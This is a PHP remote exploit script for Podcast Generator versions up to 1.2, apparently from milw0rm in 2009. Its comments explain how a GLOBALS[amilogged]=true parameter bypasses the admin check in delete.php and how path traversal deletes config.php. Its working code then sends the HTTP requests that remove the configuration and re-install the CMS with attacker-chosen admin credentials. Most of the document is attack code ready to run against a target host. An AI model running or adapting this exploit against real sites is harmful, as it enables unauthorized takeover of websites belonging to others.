<?php
#
# Podcast Generator <= 1.2 unauthorized CMS Re-Installation Remote Exploit
# 
# by staker
# --------------------------------------
# mail: staker[at]hotmail[dot]it
# url: http://podcastgen.sourceforge.net
# -------------------------------------- 
# 
# it works with register_globals=on
#  
# short explanation:
#
# ---------------------------------------- 
# Podcast Generator contains one flaw that
# allows an attacker to re-install the cms
# because of unlink() in 'delete.php' file
# ----------------------------------------
# Look at '/core/admin/delete.php'
# (removed author's comments)
/*

<?php
if (isset($_REQUEST['absoluteurl']) OR isset($_REQUEST['amilogged']) OR isset($_REQUEST['theme_path'])) 
{  exit; } <-------- {1}

if ($amilogged != "true") { exit; } <-------{2}

    if (isset($_GET['file']) AND $_GET['file']!=NULL) {
    $file = $_GET['file']; 
     $ext = $_GET['ext'];
	
	if (file_exists("$absoluteurl$upload_dir$file.$ext")) { 
		unlink ("$upload_dir$file.$ext"); <--------{3}
		$PG_mainbody .="<p><b>$file.$ext</b> $L_deleted</p>";
	}


*/
#
# Explanation (code snippet above [points])
# -----------------------------------------------------------------------------------
# 1. blocks all 'amilogged' REQUEST variables,what about GLOBALS?,therefore useless!
# 2. if 'amilogged' isn't true -> exit() function activated. 
# 3. unlink() delete an existing file.
# -----------------------------------------------------------------------------------
#
# It's possible to delete 'config.php' to re-install the cms. we need 'amilogged'
# set to true. We can do it using a GLOBALS variable.
#
# admin/core/delete.php?GLOBALS[amilogged]=true&file=../../config&ext=php
# 
# Various:
# --------------------------------------------------
# They didn't help me but i want to give a thanks to 
# girex,skerno,Chaomel,XaDoS,Dante90 and Gianluka_95   
# --------------------------------------------------
# Today is: 02 June 2009. 
# Location: Italy,Turin.
# http://www.youtube.com/watch?v=dBc7mK5iAH0
# --------------------------------------------------

error_reporting(E_STRICT ^ E_WARNING);

if ($argc < 2) start_usage();            

$host = $argv[1];
$path = $argv[2];

re_install();

function send_request($data)
{        
        global $host;
        
        if (!$sock = @fsockopen($host,80)) {
               die("connection refused..\n");
        }
        
        if (isset($data)) { 
               fputs($sock,$data);
        } 
               
        while (!feof($sock)) { $result .= fgets($sock); }           
        
        fclose($sock);
        return $result;
}


function remove_config()
{ 
        global $host,$path;
        
        $in_lex = "/{$path}/core/admin/delete.php?GLOBALS[amilogged]=true&file=../../config&ext=php";
        
        $config  = "GET {$in_lex} HTTP/1.1\r\n";
        $config .= "User-Agent: Lynx (textmode)\r\n";
        $config .= "Host: {$host}\r\n";
        $config .= "Connection: close\r\n\r\n";
        
        $lol = send_request($config);
        
        if (check_config() != FALSE) {
              die("register_globals=off, exploit failed!\n");
        }
        else {
             return true;
        }           
}


function re_install()
{ 
        global $host,$path;
       
        $binary = "username=staker&password=killingyourself&password2=killingyourself&setuplanguage=en"; 
         
        $config  = "POST {$path}/setup/index.php?step=5 HTTP/1.1\r\n";
        $config .= "User-Agent: Lynx (textmode)\r\n";
        $config .= "Host: {$host}\r\n";
        $config .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $config .= "Content-Length: ".strlen($binary)."\r\n";
        $config .= "Connection: close\r\n\r\n";
        $config .= $binary;
        
        remove_config();
        $content = send_request($config);
        
        
        if (eregi('Creation of the configuration file',$content)) {
             echo "[ re-installed successful\n";
             echo "[ username: staker\n[ password: killingyourself\n"; exit(0);
        }
        else {
             die("Exploit failed\n");
        }                 
}
       



function check_config()
{ 
        global $host,$path;
        
        $config  = "GET /{$path}/config.php HTTP/1.1\r\n";
        $config .= "User-Agent: Lynx (textmode)\r\n";
        $config .= "Host: {$host}\r\n";
        $config .= "Connection: close\r\n\r\n";
        
        $content = send_request($config);
        
        if (ereg('HTTP/1.1 404 Not Found',$content))  {
              return false;
        }      
        else {
              return true;            
        }
}


function start_usage()
{
         print "[*--------------------------------------------------------------------------*]\n".
               "[* Podcast Generator <= 1.2 unauthorized CMS Re-Installation Remote Exploit *]\n".
               "[*--------------------------------------------------------------------------*]\n". 
               "[* Usage: php podcast_xpl.php [host] [path]                                 *]\n".
               "[* [host] host -> example: localhost                                        *]\n".
               "[* [path] path -> example: /podcast                                         *]\n".
               "[*--------------------------------------------------------------------------*]\n";
         die();       
}

# milw0rm.com [2009-06-03]
